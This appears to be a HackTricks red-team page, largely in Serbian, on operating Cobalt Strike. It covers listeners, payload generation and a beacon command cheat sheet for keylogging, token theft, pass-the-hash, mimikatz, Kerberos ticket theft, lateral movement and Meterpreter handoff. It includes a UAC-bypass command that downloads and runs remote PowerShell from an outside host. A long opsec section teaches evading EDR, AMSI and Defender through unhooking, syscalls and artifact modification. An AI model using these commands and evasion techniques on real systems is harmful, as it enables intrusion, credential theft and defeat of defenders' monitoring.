# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, zatim možete izabrati gde će se osluškivati, koju vrstu beacon-a koristiti (http, dns, smb...) i još mnogo toga.

### Peer2Peer Listeners

Beacon-i ovih listener-a ne moraju direktno da komuniciraju sa C2; mogu da komuniciraju sa njim preko drugih beacon-a.

`Cobalt Strike -> Listeners -> Add/Edit`, zatim morate izabrati TCP ili SMB beacon-e.

* **TCP beacon će postaviti listener na izabranom portu**. Da biste se povezali sa TCP beacon-om, koristite komandu `connect <ip> <port>` iz drugog beacon-a.
* **smb beacon će osluškivati na pipename-u sa izabranim nazivom**. Da biste se povezali sa SMB beacon-om, potrebno je da koristite komandu `link [target] [pipe]`.

### Generisanje i hostovanje payload-a

#### Generisanje payload-a u datotekama

`Attacks -> Packages ->`

* **`HTMLApplication`** za HTA datoteke
* **`MS Office Macro`** za Office dokument sa macro-om
* **`Windows Executable`** za .exe, .dll ili service .exe
* **`Windows Executable (S)`** za **stageless** .exe, .dll ili service .exe (stageless je bolji od staged, jer ima manje IoC-ova)

#### Generisanje i hostovanje payload-a

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Ovo će generisati script/executable za preuzimanje beacon-a iz Cobalt Strike-a u formatima kao što su: bitsadmin, exe, powershell i python.

#### Hostovanje payload-a

Ako već imate datoteku koju želite da hostujete na web serveru, idite na `Attacks -> Web Drive-by -> Host File`, izaberite datoteku za hostovanje i konfiguraciju web servera.

### Beacon Options

<details>
<summary>Opcije i komande za beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom agent mora samo da komunicira sa HTTP/S protokolom Cobalt Strike Team Server-a (podrazumevani malleable C2 profile) kako bi se registrovao/prijavio i primao zadatke. Implementirajte iste URI-je/headers/metadata crypto definisane u profilu da biste ponovo koristili Cobalt Strike UI za zadavanje zadataka i preuzimanje izlaza.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (npr. `CustomBeacon.cna`) može da obuhvati generisanje payload-a za non-Windows beacon, tako da operatori mogu da izaberu listener i direktno iz GUI-ja generišu ELF payload-e.
- Primeri Linux task handler-a izloženih Team Server-u: `sleep`, `cd`, `pwd`, `shell` (izvršava proizvoljne komande), `ls`, `upload`, `download` i `exit`. Oni se mapiraju na task ID-jeve koje očekuje Team Server i moraju biti implementirani na server-side-u da bi vraćali izlaz u odgovarajućem formatu.
- BOF podrška na Linux-u može se dodati učitavanjem Beacon Object Files u isti proces pomoću [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (podržava i BOF-ove u Outflank stilu), što omogućava da se modularni post-exploitation izvršava unutar konteksta/privilegija implanta, bez kreiranja novih procesa.<sup>[[2]](#references)[[3]](#references)</sup>
- Ugradite SOCKS handler u custom beacon kako biste zadržali pivoting paritet sa Windows Beacon-ima: kada operator pokrene `socks <port>`, implant treba da otvori lokalni proxy za rutiranje operatorskih alata kroz kompromitovani Linux host ka internim mrežama.

## Opsec

### Execute-Assembly

**`execute-assembly`** koristi **sacrificial process** pomoću remote process injection-a za izvršavanje navedenog programa. Ovo je veoma bučno, jer se za injectovanje u proces koriste određeni Win API-ji koje svaki EDR proverava. Međutim, postoje određeni custom alati koji mogu da učitaju nešto u isti proces:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- U Cobalt Strike-u možete koristiti i BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor` kreira komandu `helpx` u Cobalt Strike-u, koja će obojiti komande i označiti da li su BOF-ovi (zeleno), da li su Frok&Run (žuto) i slično, ili da li su ProcessExecution, injection ili slično (crveno). To pomaže da se utvrdi koje su komande stealthy-ije.

### Ponašajte se kao korisnik

Možete proveriti događaje poput `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Proverite sva interaktivna logovanja da biste utvrdili uobičajeno radno vreme.
- System EID 12,13 - Proverite učestalost gašenja/pokretanja/sleep-a.
- Security EID 4624/4625 - Proverite dolazne validne/nevalidne NTLM pokušaje.
- Security EID 4648 - Ovaj događaj se kreira kada se plaintext credentials koriste za logovanje. Ako ga je generisao proces, binary potencijalno sadrži credentials u clear text-u u config fajlu ili unutar koda.

Kada koristite `jump` iz Cobalt Strike-a, bolje je koristiti `wmi_msbuild` metod kako bi novi proces izgledao legitimnije.

### Koristite computer accounts

Uobičajeno je da defenders proveravaju čudna ponašanja koja generišu korisnici i **isključuju service accounts i computer accounts poput `*$` iz svog monitoring-a**. Ove naloge možete koristiti za lateral movement ili privilege escalation.

### Koristite stageless payload-e

Stageless payload-i su manje bučni od staged payload-a jer ne moraju da preuzmu drugi stage sa C2 server-a. To znači da ne generišu network traffic nakon inicijalne konekcije, zbog čega je manja verovatnoća da će ih detektovati network-based defenses.

### Tokens & Token Store

Budite oprezni kada kradete ili generišete tokene, jer bi EDR mogao da enumeriše sve tokene svih thread-ova i pronađe **token koji pripada drugom korisniku** ili čak SYSTEM-u u procesu.

Ovo omogućava čuvanje tokena **po beacon-u**, tako da nije potrebno krasti isti token iznova. Ovo je korisno za lateral movement ili kada je potrebno više puta koristiti ukradeni token:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Prilikom lateralnog kretanja obično je bolje **ukrasti token nego generisati novi** ili izvršiti pass the hash attack.

### Guardrails

Cobalt Strike ima funkciju pod nazivom **Guardrails**, koja pomaže u sprečavanju korišćenja određenih komandi ili akcija koje bi defenders mogli da detektuju. Guardrails se mogu konfigurisati tako da blokiraju određene komande, poput `make_token`, `jump`, `remote-exec` i drugih koje se često koriste za lateral movement ili privilege escalation.

Pored toga, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) takođe sadrži određene provere i ideje koje možete razmotriti pre izvršavanja payload-a.

### Tickets encryption

U AD-u budite oprezni sa enkripcijom ticket-a. Podrazumevano, neki alati će koristiti RC4 enkripciju za Kerberos ticket-e, koja je manje bezbedna od AES enkripcije, dok će ažurirana okruženja podrazumevano koristiti AES. Ovo mogu detektovati defenders koji nadziru slabe encryption algoritme.

### Izbegavajte podrazumevane vrednosti

Kada koristite Cobalt Strike, SMB pipes će podrazumevano imati naziv `msagent_####` i `"status_####"`. Promenite te nazive. Nazive postojećih pipe-ova možete proveriti iz Cobalt Strike-a komandom: `ls \\.\pipe\`

Pored toga, sa SSH sesijama kreira se pipe pod nazivom `\\.\pipe\postex_ssh_####`. Promenite ga pomoću `set ssh_pipename "<new_name>";`.

Takođe, tokom post-exploitation napada pipe-ovi `\\.\pipe\postex_####` mogu biti izmenjeni pomoću `set pipename "<new_name>"`.

U Cobalt Strike profilima možete izmeniti i sledeće:

- Izbegavanje korišćenja `rwx`
- Način funkcionisanja process injection-a (koji će API-ji biti korišćeni) u bloku `process-inject {...}`
- Način funkcionisanja "fork and run" u bloku `post-ex {…}`
- Vreme sleep-a
- Maksimalnu veličinu binary-ja koji se učitavaju u memoriju
- Memory footprint i DLL sadržaj pomoću bloka `stage {...}`
- Network traffic

### Zaobilaženje memory scanning-a

Neki EDR-ovi skeniraju memoriju u potrazi za poznatim malware signatures. Cobalt Strike omogućava izmenu funkcije `sleep_mask` kao BOF-a koji može da enkriptuje backdoor u memoriji.

### Bučni proc injections

Injectovanje koda u proces obično je veoma bučno, jer **nijedan regularni proces obično ne obavlja ovu radnju, a načini za njeno izvršavanje su veoma ograničeni**. Zbog toga ga mogu detektovati behavior-based detection systems. Pored toga, EDR-ovi ga mogu detektovati skeniranjem network-a u potrazi za **thread-ovima koji sadrže kod koji ne postoji na disku** (iako procesi poput browser-a koji koriste JIT to često rade). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID i PPID odnosi

Prilikom kreiranja novog procesa važno je **održavati uobičajen parent-child** odnos između procesa kako bi se izbegla detekcija. Ako svchost.exec izvršava iexplorer.exe, to će izgledati sumnjivo, jer svchost.exe nije parent iexplorer.exe procesa u normalnom Windows okruženju.

Kada se u Cobalt Strike-u podrazumevano kreira novi beacon, kreira se proces koji koristi **`rundll32.exe`** za pokretanje novog listener-a. Ovo nije naročito stealthy i EDR-ovi ga lako mogu detektovati. Pored toga, `rundll32.exe` se pokreće bez argumenata, što ga čini još sumnjivijim.

Pomoću sledeće Cobalt Strike komande možete navesti drugi proces za kreiranje novog beacon-a, čime se smanjuje mogućnost detekcije:
```bash
spawnto x86 svchost.exe
```
Ovu postavku **`spawnto_x86` i `spawnto_x64`** možete promeniti i u profilu.

### Proxying attackers traffic

Napadačima će ponekad biti potrebno da lokalno pokreću alate, čak i na Linux mašinama, i da saobraćaj žrtava proslede do alata (npr. NTLM relay).

Pored toga, ponekad je kod pass-the.hash ili pass-the-ticket napada za napadača neupadljivije da **doda ovaj hash ili ticket u sopstveni LSASS proces** lokalno, a zatim izvrši pivot koristeći ga, umesto da menja LSASS proces na mašini žrtve.

Međutim, morate biti **oprezni sa generisanim saobraćajem**, jer možda šaljete neuobičajen saobraćaj (Kerberos?) iz svog backdoor procesa. Zbog toga možete izvršiti pivot ka browser procesu (iako možete biti uhvaćeni pri injection-u u proces, pa razmislite o neupadljivom načinu da to uradite).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Pogledajte stranicu:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Obično u `/opt/cobaltstrike/artifact-kit` možete pronaći source code i precompiled templates (u `/src-common`) payload-a koje cobalt strike koristi za generisanje binary beacon-a.

Korišćenjem alata [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoor-om (ili samo sa compiled template-om) možete pronaći šta uzrokuje da Defender reaguje. To je obično string. Zato možete jednostavno izmeniti code koji generiše backdoor tako da se taj string ne pojavljuje u finalnom binary-ju.

Nakon izmene code-a, samo pokrenite `./build.sh` iz istog direktorijuma i kopirajte folder `dist-pipe/` na Windows klijent, u `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Ne zaboravite da učitate agresivni script `dist-pipe\artifact.cna` kako biste naveli Cobalt Strike da koristi željene resurse sa diska, a ne one koji su učitani.

#### Resource Kit

Folder ResourceKit sadrži template-e za Cobalt Strike payload-e zasnovane na script-ama, uključujući PowerShell, VBA i HTA.

Korišćenjem alata [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa template-ima možete otkriti šta se defenderu (u ovom slučaju AMSI-ju) ne dopada i izmeniti to:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifikovanjem detektovanih linija može se generisati template koji neće biti detektovan.

Ne zaboravite da učitate aggressive script `ResourceKit\resources.cna` kako biste naveli Cobalt Strike da koristi željene resources sa diska, a ne one koje su već učitane.

#### Function hooks | Syscall

Function hooking je veoma čest metod koji ERD-ovi koriste za detekciju malicious aktivnosti. Cobalt Strike omogućava zaobilaženje ovih hooks korišćenjem **syscalls** umesto standardnih Windows API poziva uz pomoć **`None`** konfiguracije, korišćenjem `Nt*` verzije funkcije sa podešavanjem **`Direct`**, ili jednostavnim preskakanjem `Nt*` funkcije pomoću opcije **`Indirect`** u malleable profilu. U zavisnosti od sistema, jedna opcija može biti stealthier od druge.

Ovo se može podesiti u profilu ili pomoću komande **`syscall-method`**

Međutim, ovo takođe može biti noisy.

Jedna od opcija koje Cobalt Strike pruža za zaobilaženje function hooks jeste uklanjanje tih hooks pomoću: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Takođe možete proveriti koje funkcije imaju hooks pomoću [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ili [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Razne Cobalt Strike komande</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Reference

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42 analiza Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC dnevnik o Cobalt Strike saobraćaju](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
